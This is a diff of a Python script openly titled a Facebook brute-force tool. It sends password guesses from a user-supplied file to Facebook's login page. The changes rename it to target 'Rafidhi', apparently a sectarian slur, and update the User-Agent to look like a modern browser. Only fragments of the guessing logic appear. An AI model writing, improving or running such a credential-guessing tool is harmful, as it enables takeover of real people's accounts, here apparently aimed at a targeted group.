@@ -7,14 +7,14 @@ import sys
 
 if sys.version_info[0] !=3:
         print('''--------------------------------------
-        REQUIRED PYTHON 3.x                                                   use: python3 fb.py
+        REQUIRED PYTHON 3.x                                                   use: python Ali Rafidhi.py
 --------------------------------------
                         ''')
         sys.exit()
 
 post_url='https://www.facebook.com/login.php'
 headers = {
-        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
+        'User-Agent':'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
 }
 payload={}
 cookie={}
@@ -44,7 +44,7 @@ def function(email,passw,i):
                 return True
         return False
 
-print('\n---------- Welcome To Facebook BruteForce ----------\n')
+print('\n---------- Attack on Facebook password on Rafidhi ----------\n')
 file= input("Enter File Name : ")
 
 file= open(file, "r")
